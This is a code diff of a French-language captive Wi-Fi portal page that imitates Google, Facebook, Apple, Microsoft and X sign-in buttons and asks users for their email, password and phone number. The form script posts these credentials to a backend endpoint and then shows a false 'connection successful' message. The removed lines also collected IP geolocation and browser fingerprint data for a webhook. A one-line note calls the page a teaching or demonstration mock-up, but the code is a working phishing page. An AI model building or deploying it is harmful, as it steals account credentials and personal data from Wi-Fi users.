@@ -4,126 +4,126 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Portail Wi-Fi – Connexion</title>
-  <link href="https://fonts.googleapis.com/css2?family=Google+Sans&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    * { box-sizing: border-box; }
+    :root {
+      --primary: #1a73e8;
+      --gray: #f2f3f5;
+      --text: #202124;
+      --subtext: #5f6368;
+      --radius: 10px;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Inter', sans-serif;
+    }
 
     body {
-      margin: 0;
-      background: #f2f3f5;
-      font-family: 'Google Sans', Roboto, sans-serif;
+      background: var(--gray);
+      height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      height: 100vh;
-      padding: 16px;
+      padding: 1rem;
     }
 
     .container {
       background: white;
-      border-radius: 8px;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.1), 0 4px 8px rgba(0,0,0,0.1);
-      padding: 40px;
+      padding: 2rem;
+      border-radius: var(--radius);
+      max-width: 400px;
       width: 100%;
-      max-width: 420px;
+      box-shadow: 0 5px 25px rgba(0,0,0,0.1);
       text-align: center;
     }
 
     .logo-placeholder {
-      width: 96px;
-      height: 96px;
-      background: #4285F4;
-      border-radius: 50%;
-      margin: 0 auto 24px;
+      width: 72px;
+      height: 72px;
+      background: var(--primary);
+      color: white;
+      font-size: 24px;
+      font-weight: bold;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 32px;
-      color: #fff;
-      font-weight: bold;
+      border-radius: 50%;
+      margin: 0 auto 1rem;
     }
 
     h1 {
-      font-size: 24px;
-      font-weight: 400;
-      color: #202124;
-      margin: 0 0 8px;
+      font-size: 1.5rem;
+      color: var(--text);
+      margin-bottom: 0.5rem;
     }
 
     .subtext {
-      font-size: 16px;
-      color: #5f6368;
-      margin-bottom: 32px;
+      color: var(--subtext);
+      font-size: 0.95rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .provider-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      padding: 0.75rem 1rem;
+      border: 1px solid #ccc;
+      border-radius: var(--radius);
+      background: #fff;
+      width: 100%;
+      margin-bottom: 0.75rem;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .provider-btn:hover {
+      background: #f0f0f0;
+    }
+
+    .provider-btn img {
+      width: 20px;
+      height: 20px;
+    }
+
+    form {
+      display: none;
+      text-align: left;
+      margin-top: 1.5rem;
     }
 
     input {
       width: 100%;
-      padding: 14px 12px;
-      margin-bottom: 20px;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      font-size: 16px;
+      padding: 0.75rem;
+      margin-bottom: 1rem;
+      border: 1px solid #ccc;
+      border-radius: var(--radius);
+      font-size: 1rem;
     }
 
-    input:focus {
-      border-color: #1a73e8;
-      outline: none;
-    }
-
-    .btn, .provider-btn {
+    .btn-submit {
       width: 100%;
-      padding: 12px;
-      font-size: 14px;
-      font-weight: 500;
-      border-radius: 4px;
-      cursor: pointer;
-      transition: background-color 0.2s;
-      margin-bottom: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
-
-    .btn {
-      background-color: #1a73e8;
-      color: #fff;
+      background: var(--primary);
+      color: white;
       border: none;
+      padding: 0.75rem;
+      font-weight: 600;
+      border-radius: var(--radius);
+      cursor: pointer;
     }
 
-    .btn:hover {
-      background-color: #1765c1;
-    }
-
-    .provider-btn img {
-      width: 18px;
-      height: 18px;
+    .btn-submit:hover {
+      background: #1765c1;
     }
 
     .note {
-      font-size: 12px;
+      font-size: 0.75rem;
       color: red;
-      margin-top: 24px;
-    }
-
-    .provider-form {
-      display: none;
-      margin-top: 20px;
-      animation: fadeIn 0.3s ease-in-out;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    @media (max-width: 600px) {
-      .container { padding: 24px; }
-      h1 { font-size: 20px; }
-      .subtext { font-size: 14px; }
-      input { padding: 12px 10px; font-size: 14px; }
-      .btn, .provider-btn { padding: 10px; font-size: 12px; }
-      .note { font-size: 10px; }
+      margin-top: 1.5rem;
     }
   </style>
 </head>
@@ -131,111 +131,72 @@
   <div class="container">
     <div class="logo-placeholder">Wi-Fi</div>
     <h1>Connexion au Wi-Fi</h1>
-    <div class="subtext">Choisissez une méthode pour accéder à Internet</div>
+    <div class="subtext">Choisissez une méthode de connexion</div>
 
-    <!-- Faux boutons de connexion -->
     <button class="provider-btn" onclick="showForm('Google')">
-      <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google logo">
-      Se connecter avec Google
+      <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google" />
+      Continuer avec Google
     </button>
 
     <button class="provider-btn" onclick="showForm('Facebook')">
       <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook" />
-      Se connecter avec Facebook
+      Continuer avec Facebook
     </button>
 
     <button class="provider-btn" onclick="showForm('Apple')">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
-      Se connecter avec Apple
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" />
+      Continuer avec Apple
     </button>
 
     <button class="provider-btn" onclick="showForm('Microsoft')">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
-      Se connecter avec Microsoft
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" />
+      Continuer avec Microsoft
     </button>
 
     <button class="provider-btn" onclick="showForm('Twitter')">
-      <img src="https://upload.wikimedia.org/wikipedia/fr/c/c8/Twitter_Bird.svg" alt="Twitter">
-      Se connecter avec X / Twitter
+      <img src="https://upload.wikimedia.org/wikipedia/fr/c/c8/Twitter_Bird.svg" alt="Twitter" />
+      Continuer avec X / Twitter
     </button>
 
-    <form id="provider-form" class="provider-form">
+    <form id="provider-form">
       <input type="email" id="email" placeholder="Adresse e-mail" required />
       <input type="password" id="password" placeholder="Mot de passe" required />
       <input type="tel" id="phone" placeholder="Numéro de téléphone" required />
-      <button type="submit" class="btn">Continuer</button>
+      <button type="submit" class="btn-submit">Continuer</button>
     </form>
 
-    <div class="note">* Ceci est un portail captif fictif à but pédagogique uniquement.</div>
+    <div class="note">* Ceci est une page factice à but démonstratif uniquement.</div>
   </div>
 
   <script>
-    let sessionStart = Date.now();
-    let currentProvider = "Inconnu";
+    let currentProvider = 'Fournisseur inconnu';
 
     function showForm(provider) {
       currentProvider = provider;
-      document.getElementById("provider-form").style.display = "block";
+      document.getElementById('provider-form').style.display = 'block';
     }
 
-    document.getElementById("provider-form").addEventListener("submit", async function (e) {
+    document.getElementById('provider-form').addEventListener('submit', async function(e) {
       e.preventDefault();
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
-      const phone = document.getElementById("phone").value;
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const phone = document.getElementById('phone').value;
 
-      const userAgent = navigator.userAgent;
-      const lang = navigator.language;
-      const screenRes = `${window.screen.width}x${window.screen.height}`;
-      const platform = navigator.platform;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const sessionDuration = Math.round((Date.now() - sessionStart) / 1000);
-
-      let geoInfo = {
-        ip: "Inconnu", city: "Inconnue", region: "Inconnue", country: "Inconnu", org: "Inconnu"
+      const payload = {
+        provider: currentProvider,
+        email,
+        password,
+        phone,
+        userAgent: navigator.userAgent
       };
 
-      try {
-        const res = await fetch("https://ipapi.co/json");
-        const data = await res.json();
-        geoInfo = {
-          ip: data.ip,
-          city: data.city,
-          region: data.region,
-          country: data.country_name,
-          org: data.org
-        };
-      } catch (err) {
-        console.error("Erreur IP :", err);
-      }
-
-      const message = `
-🔐 Connexion ${currentProvider} (factice)
-📧 Email : ${email}
-🔑 Mot de passe : ${password}
-📱 Téléphone : ${phone}
-
-🌍 IP : ${geoInfo.ip}
-📍 Ville : ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}
-🏢 FAI : ${geoInfo.org}
-
-🧭 Navigateur : ${userAgent}
-💻 Plateforme : ${platform}
-🌐 Langue : ${lang}
-🕒 Temps passé : ${sessionDuration} sec
-📐 Écran : ${screenRes}
-🕓 Fuseau horaire : ${timezone}
-      `;
-
-      // Envoi vers ton backend ou webhook
-      fetch("/api/send", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: message })
+      await fetch('/api/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
       });
 
-      alert("Connexion réussie. Redirection en cours...");
-      document.getElementById("provider-form").reset();
+      alert('Connexion réussie. Redirection en cours...');
     });
   </script>
 </body>
